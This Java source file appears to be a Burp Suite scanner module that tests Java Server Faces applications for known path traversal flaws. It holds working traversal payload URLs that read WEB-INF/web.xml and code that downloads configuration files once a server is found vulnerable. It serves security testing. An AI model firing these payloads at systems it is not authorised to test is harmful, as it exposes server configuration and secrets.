package burp.j2ee.issues.impl;

import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IRequestInfo;
import burp.IResponseInfo;
import burp.IScanIssue;
import burp.IScannerInsertionPoint;
import burp.J2EELFIRetriever;
import burp.J2EELocalAssessment;
import static burp.J2EELocalAssessment.analyzeWEBXML;
import burp.j2ee.Confidence;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.Risk;
import burp.j2ee.issues.IModule;

import java.io.PrintWriter;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class JavaServerFacesTraversal implements IModule {

    private static final String TITLE = "Java Server Faces Path Traversal";
    private static final String DESCRIPTION = "J2EEscan identified multiple Path Traversal "
            + "vulnerabilities which could allow an attacker to obtain sensitive information."
            + "<br /><br />"
            + "<b>References</b>:<br /><br />"
            + "http://www.kb.cert.org/vuls/id/526012<br />"
            + "http://seclists.org/fulldisclosure/2012/Feb/150<br />"
            + "http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2013-3827<br />"
            + "http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2011-4367<br />"
            + "http://security.coverity.com/advisory/2013/Oct/two-path-traversal-defects-in-oracles-jsf2-implementation.html";
    private static final String REMEDY = "Upgrade to the latest version of the JSF framework.";
            
    private PrintWriter stderr;

    private List<URL> uriMutator(URL completeURI) {

        /**
         * Proof of concepts:
         *
         * http://www.example.com/someApp/javax.faces.resource.../WEB-INF/web.xml.jsf
         * http://www.example.com/someApp/javax.faces.resource.../WEB-INF/web.xml.jsf
         *
         *
         */
        List<URL> payloads = new ArrayList<>();
        List<String> jsfTraversal = new ArrayList<>();
        jsfTraversal.add("javax.faces.resource.../WEB-INF/web.xml.jsf");
        jsfTraversal.add("javax.faces.resource./WEB-INF/web.xml.jsf?ln=..");

        jsfTraversal.add("/faces/javax.faces.resource/web.xml?ln=..\\\\WEB-INF");
        jsfTraversal.add("/faces/javax.faces.resource/..\\\\WEB-INF/web.xml");

        String host = completeURI.getHost();
        String protocol = completeURI.getProtocol();
        String path = completeURI.getPath();
        int port = completeURI.getPort();

        // Test the root context
        for (String payload : jsfTraversal) {
            try {
                payloads.add(new URL(protocol, host, port, "/" + payload));
            } catch (MalformedURLException ex) {
                stderr.println("Error creating URL " + ex.getMessage());
            }
        }

        // Detect the context and append jsf path traversal payloads
        // http://www.example.org/context/test.jsf
        // ->
        // http://www.example.org/context/javax.faces.resource.../WEB-INF/web.xml.jsf
        int i = path.indexOf("/", 1);
        String context = path.substring(0, i + 1);

        // Test the dynamic context
        for (String payload : jsfTraversal) {
            try {
                payloads.add(new URL(protocol, host, port, context + payload));
            } catch (MalformedURLException ex) {
                stderr.println("Error creating URL " + ex.getMessage());
            }
        }

        return payloads;
    }

    @Override
    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {

        List<Pattern> detectionRe = new ArrayList();
        detectionRe.add(Pattern.compile("<servlet-class>javax.faces.", Pattern.CASE_INSENSITIVE | Pattern.DOTALL | Pattern.MULTILINE));

        IExtensionHelpers helpers = callbacks.getHelpers();
        stderr = new PrintWriter(callbacks.getStderr(), true);

        IRequestInfo reqInfo = helpers.analyzeRequest(baseRequestResponse);
        byte[] rawRequest = baseRequestResponse.getRequest();

        URL curURL = reqInfo.getUrl();

        byte[] modifiedRawRequest = null;
        List<IScanIssue> issues = new ArrayList<>();

        // TODO fixme
        if (curURL.getPath().contains(".jsf")
                || curURL.getPath().contains(".xhtml")
                || curURL.getPath().contains(".jsp")
                || curURL.getPath().contains(".faces")) {

            // Create the list of jsf path traversal
            List<URL> jsfPath = uriMutator(curURL);

            for (URL payload : jsfPath) {

                byte[] jsfmessage = helpers.buildHttpRequest(payload);

                IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(),
                        jsfmessage);

                //get the body of the response
                byte[] responseBytes = checkRequestResponse.getResponse();
                String response = helpers.bytesToString(responseBytes);

                // check the pattern on response body
                for (Pattern detectionRule : detectionRe) {

                    Matcher matcher = detectionRule.matcher(response);
                    if (matcher.find()) {

                        // Try to retrieve more configuration files using this threat
                        J2EELocalAssessment.analyzeWEBXML(responseBytes, callbacks, checkRequestResponse);

                        J2EELFIRetriever.download(callbacks,
                                checkRequestResponse,
                                jsfmessage,
                                "web.xml");

                        issues.add(new CustomScanIssue(
                                baseRequestResponse.getHttpService(),
                                helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                checkRequestResponse,
                                TITLE,
                                DESCRIPTION,
                                REMEDY,
                                Risk.High,
                                Confidence.Certain
                        ));

                        return issues;
                    }
                }

            }
        }

        return issues;
    }
}
